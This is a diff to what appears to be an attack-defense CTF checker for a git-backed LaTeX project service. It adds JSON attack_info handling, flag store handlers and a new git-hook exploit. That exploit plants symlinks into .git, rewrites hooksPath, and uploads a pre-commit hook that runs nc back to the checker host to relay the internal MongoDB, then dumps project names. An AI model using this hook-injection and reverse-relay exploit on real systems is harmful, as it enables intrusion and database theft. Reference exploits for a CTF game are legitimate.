@@ -39,7 +39,7 @@ async def putflag_zero(task: PutflagCheckerTaskMessage, client: AsyncClient, db:
 
     logger.info("putflag_zero: success")
 
-    return id
+    return json.dumps({'project_id': id})
 
 
 @checker.getflag(0)
@@ -79,6 +79,12 @@ async def getflag_zero(task: GetflagCheckerTaskMessage, client: AsyncClient, db:
 
 @checker.exploit(0)
 async def exploit_zero(task: ExploitCheckerTaskMessage, client: AsyncClient, searcher: FlagSearcher, logger: LoggerAdapter) -> str:
+    attack_info = json.loads(task.attack_info)
+    if 'project_id' not in attack_info:
+        raise MumbleException("Missing project_id in attack_info")
+    
+    f_id = attack_info['project_id']
+
     (username, password, _, id) = await create_user_and_project(client, None, logger)
 
     path = await clone_project(username, password, id, task.address, logger)
@@ -87,8 +93,6 @@ async def exploit_zero(task: ExploitCheckerTaskMessage, client: AsyncClient, sea
         f"{path}/main.tex"), True, "file not created")
 
     # add a symlink
-    f_id = task.attack_info
-
     target = f"/app/data/projects/{f_id[0:2]}/{f_id}/main.tex"
     os_succ(os.system(f"mkdir -p {target}/.. {dev_null}"))
     os_succ(os.system(f"touch {target} {dev_null}"))
@@ -111,11 +115,13 @@ async def exploit_zero(task: ExploitCheckerTaskMessage, client: AsyncClient, sea
 async def exploit_one(task: ExploitCheckerTaskMessage, client: AsyncClient, searcher: FlagSearcher, logger: LoggerAdapter) -> str:
     (_, _, _, id) = await create_user_and_project(client, None, logger)
 
-    f_id = task.attack_info
+    attack_info = json.loads(task.attack_info)
+    if 'project_id' not in attack_info:
+        raise MumbleException("Missing project_id in attack_info")
+    
+    f_id = attack_info['project_id']
 
     # gizmo to forward a connection
-    checker_forward_port = "4244"
-    checker_ip = "192.168.178.33"
     forward = subprocess.Popen(["ncat", "-lvnp", checker_forward_port, '-ke', '/usr/bin/ncat -lvnp 1234'], stdout=open(os.devnull, 'w'), stderr=subprocess.STDOUT)
     
     clone = subprocess.Popen(["bash", '-c', f"while true; do git clone http://127.0.0.1:1234/{f_id} /tmp/{f_id} &> /dev/null && break; done"])
@@ -149,6 +155,89 @@ async def exploit_one(task: ExploitCheckerTaskMessage, client: AsyncClient, sear
     if flag := searcher.search_flag(output):
         return flag
 
+@checker.putflag(1)
+async def putflag_one(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
+    (username, _, _, _) = await create_user_and_project(client, db, logger, project_name=task.flag)
+    return json.dumps({'username': username})
+
+@checker.getflag(1)
+async def getflag_one(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:
+    try:
+        (username, password) = await db.get("credentials")
+        (_, id) = await db.get('project')
+    except KeyError:
+        raise MumbleException("Missing database entry from putflag")
+
+    await login_user(client, username, password, logger)
+
+    projects = await list_projects(client, logger)
+    for project in projects:
+        if project["name"] == task.flag and project["id"] == id:
+            return project["name"]
+    
+    raise MumbleException("Flag not found.")
+
+@checker.exploit(2)
+async def exploit_git_hooks(task: ExploitCheckerTaskMessage, client: AsyncClient, searcher: FlagSearcher, logger: LoggerAdapter) -> str:
+    for _ in range(2): # my code has a bug somewhere so lets try it twice :D
+        attack_info = json.loads(task.attack_info)
+        if 'username' not in attack_info:
+            raise MumbleException("Missing username in attack_info")
+        
+        # create a project
+        (username, password, _, id) = await create_user_and_project(client, None, logger)
+        path_in_container = "/data"
+        # clone it locally
+        path = await clone_project(username, password, id, task.address, logger)
+        # setup a symlink to the git folder
+        os_succ(os.system(f"ln -s ./.git {path}/git"))
+        # setup a folder for a symlink to the pre-commit hook
+        os_succ(os.system(f"mkdir -p {path}/hooks"))
+        os_succ(os.system(f"ln -s ../.git/hooks/pre-commit.sample {path}/hooks/pre-commit"))
+
+        await git_config_commit_and_push(path, username, "Exploit!", logger)
+
+        await cleanup_clone(path)
+
+        # let the server pull the changes
+        await pull(client, id, logger)
+
+        # change the hook path used
+        config_str = await download_file(client, id, "git/config", logger)
+        lines = config_str.split("\n")
+        lines.insert(1, f"\thooksPath = {path_in_container}/hooks")
+        config_str = "\n".join(lines)
+        await upload_file(client, id, "git/config", config_str, logger)
+
+        forward_code = f"while true; do nc {checker_ip} {checker_forward_port} -e /usr/bin/nc db 27017 && break; done"
+        await upload_file(client, id, "hooks/pre-commit", f"#!/bin/sh\n{forward_code}", logger)
+
+        await upload_file(client, id, "someChangedFile", "this file is new!", logger)
+
+        dump_command = "mongo --host 127.0.0.1 --port 1234 --username=root --password=password --eval 'DBQuery.shellBatchSize=1000000000; db.projects.find({}, {name:1})' &>> /tmp/dump.json"
+
+        forward = subprocess.Popen(["ncat", "-lvnp", checker_forward_port, '-ke', '/usr/bin/ncat -lvnp 1234'], stdout=open(os.devnull, 'w'), stderr=subprocess.STDOUT)
+        dump = subprocess.Popen(["bash", '-c', f"while true; do {dump_command} && break; done"])
+
+        await commit(client, id, "Exploit!", logger, True) # trigger the pre-commit hook
+
+        forward.kill()
+        dump.kill()
+
+        if not os.path.exists("/tmp/dump.json"):
+            raise MumbleException("Dump file not found")
+
+        with open("/tmp/dump.json", "r") as f:
+            output = f.read()
+
+        os_succ(os.system("rm -rf /tmp/dump.json"))
+
+        if flag := searcher.search_flag(output):
+            return flag
+        
+        await asyncio.sleep(1)
+
+    raise MumbleException(output)
 
 @checker.putnoise(0)
 async def putnoise_file_content(task: PutnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter):
@@ -170,7 +259,7 @@ async def putnoise_file_content(task: PutnoiseCheckerTaskMessage, client: AsyncC
 async def getnoise_file_content(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter):
     try:
         (username, password) = await db.get("credentials")
-        (name, id) = await db.get("project")
+        (_, id) = await db.get("project")
         (noise_name, noise) = await db.get("noise")
     except KeyError:
         raise MumbleException("getnoise w/o putnoise")
